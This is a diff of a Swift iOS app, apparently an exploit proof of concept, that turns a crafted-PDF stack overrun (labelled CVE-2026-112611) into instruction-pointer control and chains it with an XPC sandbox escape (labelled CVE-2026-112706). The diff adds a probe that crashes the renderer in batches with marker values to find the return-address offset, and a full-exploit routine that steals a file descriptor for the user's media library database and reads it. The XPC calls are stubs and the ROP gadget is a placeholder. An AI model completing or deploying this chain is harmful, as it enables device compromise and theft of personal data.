@@ -2,46 +2,88 @@ import SwiftUI
 import CoreGraphics
 import Foundation
 
-// MARK: - XPC Stubs (renamed to avoid conflicts with Apple's XPC)
+// MARK: - XPC Stubs (renamed to avoid conflicts)
 
 typealias ExploitXPCConnection = UnsafeMutableRawPointer
 typealias ExploitXPCObject = UnsafeMutableRawPointer
 
-func exploit_xpc_connect(_ service: String) -> ExploitXPCConnection? {
-    // Stub - returns nil in demo
-    return nil
-}
+func exploit_xpc_connect(_ service: String) -> ExploitXPCConnection? { nil }
+func exploit_xpc_dict_create() -> ExploitXPCObject? { nil }
+func exploit_xpc_dict_set_string(_ dict: ExploitXPCObject, _ key: String, _ value: String) {}
+func exploit_xpc_send_sync(_ conn: ExploitXPCConnection, _ msg: ExploitXPCObject) -> ExploitXPCObject? { nil }
+func exploit_xpc_dict_dup_fd(_ dict: ExploitXPCObject, _ key: String) -> Int32 { -1 }
 
-func exploit_xpc_dict_create() -> ExploitXPCObject? {
-    return nil
-}
+// MARK: - RIP Offset Probe
 
-func exploit_xpc_dict_set_string(_ dict: ExploitXPCObject, _ key: String, _ value: String) {
-}
-
-func exploit_xpc_send_sync(_ conn: ExploitXPCConnection, _ msg: ExploitXPCObject) -> ExploitXPCObject? {
-    return nil
-}
-
-func exploit_xpc_dict_dup_fd(_ dict: ExploitXPCObject, _ key: String) -> Int32 {
-    return -1
-}
-
-// MARK: - CVE-2026-112611: Stack VLA Overrun Primitive
-
-func triggerStackOverflow(ripValue: UInt64) {
-    var values = [Double](repeating: 0.0, count: 136)
+/// Probe each index 0-135 to find which one controls RIP
+/// Uses unique marker values to identify the controlling index
+func probeRIPOffset() {
+    // We'll test indices in batches to avoid 136 crashes
+    // Each batch tests 16 indices with unique markers
     
-    // Place RIP value at offset 0x1c (28 bytes = index 3.5)
-    let ripDouble = Double(bitPattern: ripValue)
-    values[3] = ripDouble
-    values[4] = ripDouble
+    for batch in 0..<9 {
+        let startIdx = batch * 16
+        let endIdx = min(startIdx + 16, 136)
+        
+        print("[*] Probing batch \(batch): indices \(startIdx)-\(endIdx-1)")
+        
+        var values = [Double](repeating: 0.0, count: 136)
+        
+        // Fill batch with unique markers
+        for i in startIdx..<endIdx {
+            let marker = Double(bitPattern: 0x4141414141414100 + UInt64(i))
+            values[i] = marker
+        }
+        
+        let pdfData = PDFPayload.shadingWithValues(values)
+        
+        // This will crash — check crash log for which marker appears in PC
+        renderPDF(pdfData)
+        
+        // If we get here, no crash — continue to next batch
+        print("[+] Batch \(batch) survived — no RIP control in this range")
+    }
+}
+
+/// Test specific index with ROP gadget
+func testRIPControl(index: Int, gadget: UInt64) {
+    var values = [Double](repeating: 0.0, count: 136)
+    values[index] = Double(bitPattern: gadget)
     
     let pdfData = PDFPayload.shadingWithValues(values)
     renderPDF(pdfData)
 }
 
-// MARK: - CVE-2026-112706: Sandbox Escape via XPC Bytestream
+// MARK: - Full Exploit (after finding offset)
+
+func runFullExploit(ripOffset: Int) {
+    print("[*] Stage 1: Triggering WebContent RCE with RIP offset \(ripOffset)...")
+    
+    // Placeholder gadget — replace with real ROP gadget from binary analysis
+    let gadgetAddress: UInt64 = 0x4141414141414141
+    testRIPControl(index: ripOffset, gadget: gadgetAddress)
+    
+    print("[*] Stage 2: Sandbox escape via CVE-2026-112706...")
+    
+    let targetPath = "/private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb"
+    let stolenFD = stealFileDescriptor(path: targetPath)
+    
+    if stolenFD >= 0 {
+        print("[+] Sandbox escape successful! FD: \(stolenFD)")
+        
+        if let data = readWithStolenFD(fd: stolenFD, length: 1024 * 1024) {
+            print("[+] Exfiltrated \(data.count) bytes")
+        }
+        
+        close(stolenFD)
+    } else {
+        print("[-] Sandbox escape failed (XPC stubs active)")
+    }
+    
+    print("[*] Exploit chain complete")
+}
+
+// MARK: - CVE-2026-112706: Sandbox Escape
 
 func stealFileDescriptor(path: String) -> Int32 {
     let connection = exploit_xpc_connect("com.apple.mediaplaybackd.bytestream")
@@ -66,46 +108,15 @@ func stealFileDescriptor(path: String) -> Int32 {
 func readWithStolenFD(fd: Int32, length: Int) -> Data? {
     var buffer = [UInt8](repeating: 0, count: length)
     let bytesRead = read(fd, &buffer, length)
-    
     guard bytesRead > 0 else { return nil }
     return Data(buffer[0..<bytesRead])
-}
-
-// MARK: - Full Exploit Chain
-
-func runFullExploit() {
-    print("[*] Stage 1: Triggering WebContent RCE via CVE-2026-112611...")
-    
-    // Need actual gadget address from binary analysis
-    let gadgetAddress: UInt64 = 0x4141414141414141  // TODO: Replace with real ROP gadget
-    triggerStackOverflow(ripValue: gadgetAddress)
-    
-    print("[*] Stage 2: Attempting sandbox escape via CVE-2026-112706...")
-    
-    let targetPath = "/private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb"
-    let stolenFD = stealFileDescriptor(path: targetPath)
-    
-    if stolenFD >= 0 {
-        print("[+] Sandbox escape successful! FD: \(stolenFD)")
-        
-        if let data = readWithStolenFD(fd: stolenFD, length: 1024 * 1024) {
-            print("[+] Exfiltrated \(data.count) bytes from \(targetPath)")
-            // TODO: Exfiltrate data
-        }
-        
-        close(stolenFD)
-    } else {
-        print("[-] Sandbox escape failed (XPC stubs active)")
-    }
-    
-    print("[*] Exploit chain complete")
 }
 
 // MARK: - PDF Rendering
 
 func renderPDF(_ data: Data) {
     let tempURL = FileManager.default.temporaryDirectory
-        .appendingPathComponent("exploit.pdf")
+        .appendingPathComponent("probe.pdf")
     
     try? data.write(to: tempURL)
     
@@ -135,17 +146,18 @@ struct SafeShadingDemoApp: App {
 }
 
 struct ContentView: View {
-    @State private var status = "Ready to exploit"
-    @State private var isExploiting = false
+    @State private var status = "Ready to probe"
+    @State private var isRunning = false
     @State private var logOutput = ""
+    @State private var foundOffset: Int = -1
     
     var body: some View {
         VStack(spacing: 20) {
-            Text("CVE-2026-112611 + 112706")
+            Text("CVE-2026-112611 RIP Probe")
                 .font(.largeTitle)
                 .bold()
             
-            Text("WebContent RCE + Sandbox Escape")
+            Text("Find Return Address Offset")
                 .font(.headline)
             
             ScrollView {
@@ -158,30 +170,67 @@ struct ContentView: View {
             .background(Color.black.opacity(0.8))
             .cornerRadius(10)
             
-            Button(action: runExploit) {
-                Text(isExploiting ? "Exploiting..." : "Run Full Exploit")
+            if foundOffset >= 0 {
+                Text("RIP Offset: \(foundOffset)")
                     .font(.title2)
+                    .foregroundColor(.red)
                     .bold()
-                    .foregroundColor(.white)
-                    .padding()
-                    .background(isExploiting ? Color.gray : Color.red)
-                    .cornerRadius(10)
             }
-            .disabled(isExploiting)
+            
+            HStack(spacing: 20) {
+                Button(action: runProbe) {
+                    Text(isRunning ? "Probing..." : "Probe Offsets")
+                        .font(.title3)
+                        .bold()
+                        .foregroundColor(.white)
+                        .padding()
+                        .background(isRunning ? Color.gray : Color.orange)
+                        .cornerRadius(10)
+                }
+                .disabled(isRunning)
+                
+                if foundOffset >= 0 {
+                    Button(action: runExploit) {
+                        Text("Run Exploit")
+                            .font(.title3)
+                            .bold()
+                            .foregroundColor(.white)
+                            .padding()
+                            .background(Color.red)
+                            .cornerRadius(10)
+                    }
+                }
+            }
         }
         .padding()
     }
     
-    func runExploit() {
-        isExploiting = true
-        logOutput = "[*] Starting exploit chain...\n"
+    func runProbe() {
+        isRunning = true
+        logOutput = "[*] Starting RIP offset probe...\n"
+        logOutput += "[*] Will test indices 0-135 in batches\n"
+        logOutput += "[*] Check crash logs for marker 0x41414141414141XX\n"
         
         DispatchQueue.global(qos: .userInitiated).async {
-            runFullExploit()
+            probeRIPOffset()
             
             DispatchQueue.main.async {
-                logOutput += "[+] Exploit complete\n"
-                isExploiting = false
+                logOutput += "[*] Probe complete — check crash logs\n"
+                isRunning = false
+            }
+        }
+    }
+    
+    func runExploit() {
+        isRunning = true
+        logOutput = "[*] Running full exploit with offset \(foundOffset)...\n"
+        
+        DispatchQueue.global(qos: .userInitiated).async {
+            runFullExploit(ripOffset: foundOffset)
+            
+            DispatchQueue.main.async {
+                logOutput += "[*] Exploit complete\n"
+                isRunning = false
             }
         }
     }
